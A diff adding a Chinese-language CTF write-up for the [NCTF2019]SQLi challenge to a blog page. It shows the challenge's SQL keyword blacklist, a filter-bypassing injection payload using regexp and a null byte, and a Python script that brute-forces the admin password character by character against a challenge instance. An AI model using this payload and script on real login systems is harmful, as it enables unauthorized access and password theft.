@@ -978,6 +978,23 @@
 
 <p>最后验证</p>
 <p><img src="/../images/image-20240305172610038.png" alt="image-20240305172610038"></p>
+<h1 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h1><p>hint.txt黑名单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure>
+
+<p>登录的密码等于admin的密码就可以得到flag，但是admin被过滤</p>
+<p>构造正则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^x&quot;;%00</span><br></pre></td></tr></table></figure>
+
+<p>相当于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where passwd regexp &quot;^x&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>写个脚本爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://40b1b73a-7f91-47bf-aa91-34652a137245.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">fuzz_dict=string.ascii_lowercase + string.digits + <span class="string">&quot;_&quot;</span></span><br><span class="line">pwd=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> fuzz_dict:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;\x00&#x27;</span>.<span class="built_in">format</span>(pwd+i)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;alert&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            pwd += i</span><br><span class="line">            <span class="built_in">print</span>(pwd)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>逐个爆破密码的每一位</p>
+<p><img src="/../images/image-20240308151934081.png" alt="image-20240308151934081"></p>
+<p>最后登录</p>
+<p><img src="/../images/image-20240308151950612.png" alt="image-20240308151950612"></p>
 
         </div>
 
